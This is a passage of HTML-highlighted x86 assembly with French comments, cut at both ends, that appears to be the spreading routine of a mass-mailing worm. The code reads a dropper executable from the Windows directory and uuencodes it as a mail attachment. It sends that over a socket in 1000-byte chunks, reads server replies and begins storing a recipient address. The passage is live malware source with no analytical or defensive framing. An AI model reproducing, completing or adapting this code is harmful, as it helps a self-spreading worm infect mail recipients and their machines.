</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper_name</span><span class="sc0">        </span><span class="sc1">;concatenate "c:\windows\" and "drop.exe"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dropper_name_size</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;------- mapper le dropper en mémoire</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;handle of file with attributes to copy (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;file attributes (80h=FILE_ATTRIBUTE_NORMAL)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">;how to create (3=OPEN_EXISTING)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;address of security descriptor (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;share mode (0=Prevents the file from being shared)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">080000000h</span><span class="sc0">     </span><span class="sc1">;access (read-write) mode (080000000h=GENERIC_READ)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">  </span><span class="sc1">;address of name of the file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_routine_uucodage_avec_liberer_memoire</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dropper_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sizeofmappedfile</span><span class="sc0">    </span><span class="sc1">;address of high-order word for file size (si ca dépasse)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dropper_handle</span><span class="sc0">     </span><span class="sc1">;handle of file to get size of </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_routine_uucodage_avec_fermer_dropper</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">sizeofmappedfile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;name of file-mapping object (0=sans nom)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;low-order 32 bits of object size  </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;high-order 32 bits of object size  (0=meme taille que le fichier)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;protection for mapping object (2=PAGE_READONLY)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;optional security attributes (0=défaut)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dropper_handle</span><span class="sc0"> </span><span class="sc1">;handle of file to map</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_routine_uucodage_avec_fermer_dropper</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">filemappinghandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;number of bytes to map (0=en entier)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;low-order 32 bits of file offset</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;high-order 32 bits of file offset (0=meme taille que le fichier?)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;access mode (4=SECTION_MAP_READ)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filemappinghandle</span><span class="sc0">  </span><span class="sc1">;file-mapping object to map into address space  </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_routine_uucodageavec_fermer_mapping</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------ uucoder le dropper depuis son mapping (binaire) jusqu'à la zone mémoire réservée</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_debut</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;transférer "begin xxxx.exe"</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizeofmappedfile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">45</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">nb_45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">reste_45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">            </span><span class="sc1">;calculer le nombre de lignes</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nb_45</span><span class="sc0">

</span><span class="sc5">code_ligne_suivante</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">

</span><span class="sc5">code_trois_octets</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tu_peux_la_lire_cette_putain_de_memoire3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_plantage_because_peut_pas_lire_la_memoire3</span><span class="sc0">
</span><span class="sc5">tu_peux_la_lire_cette_putain_de_memoire3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc5">evite_plantage_because_peut_pas_lire_la_memoire3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pas_zero1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">pas_zero1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00110000b</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tu_peux_la_lire_cette_putain_de_memoire</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_plantage_because_peut_pas_lire_la_memoire</span><span class="sc0">
</span><span class="sc5">tu_peux_la_lire_cette_putain_de_memoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc5">evite_plantage_because_peut_pas_lire_la_memoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pas_zero2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">pas_zero2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111100b</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tu_peux_la_lire_cette_putain_de_memoire2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_plantage_because_peut_pas_lire_la_memoire2</span><span class="sc0">
</span><span class="sc5">tu_peux_la_lire_cette_putain_de_memoire2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc5">evite_plantage_because_peut_pas_lire_la_memoire2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pas_zero3</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">pas_zero3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pas_zero4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">pas_zero4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">code_trois_octets</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">code_ligne_suivante</span><span class="sc0">

</span><span class="sc5">code_la_derniere_ligne</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reste_45</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_uu</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reste_45</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pas_de_reste</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">pas_de_reste</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">reste_45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">code_trois_octets</span><span class="sc0">

</span><span class="sc5">fin_uu</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_fin</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;transférer "end"</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">size_uu_file</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;se souvenir de la taille du fichier uucodé</span><span class="sc0">

</span><span class="sc1">;-------- envoyer des paquets de 1000 octets </span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_uu_file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">nb_1000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">reste_1000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">nb_1000</span><span class="sc0">

</span><span class="sc5">envoie_la_sauce</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">nb_1000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">morceau_entier</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reste_1000</span><span class="sc0">
</span><span class="sc5">morceau_entier</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_uucodage_avec_unmap</span><span class="sc0">

</span><span class="sc5">envoi_ok2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc5">nb_1000</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">envoie_la_sauce</span><span class="sc0">

</span><span class="sc1">;------- tout fermer: fichiers (dropper, dropper uucodé) et mémoire (mapping*2, buffer)</span><span class="sc0">

</span><span class="sc5">fin_routine_uucodage_avec_unmap</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">fin_routine_uucodageavec_fermer_mapping</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filemappinghandle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">fin_routine_uucodage_avec_fermer_dropper</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dropper_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">fin_routine_uucodage_avec_liberer_memoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalFree</span><span class="sc0">

</span><span class="sc5">fin_routine_uucodage</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                        RECUPERE LES MESSAGES ENTRANTS                               ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">recoit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_rcv</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">no_socket</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_rcv</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                          STOCKER RECIPIENT EN MEMOIRE                               ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">stocke_le_rcpt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_recipient</span><span class="sc0">
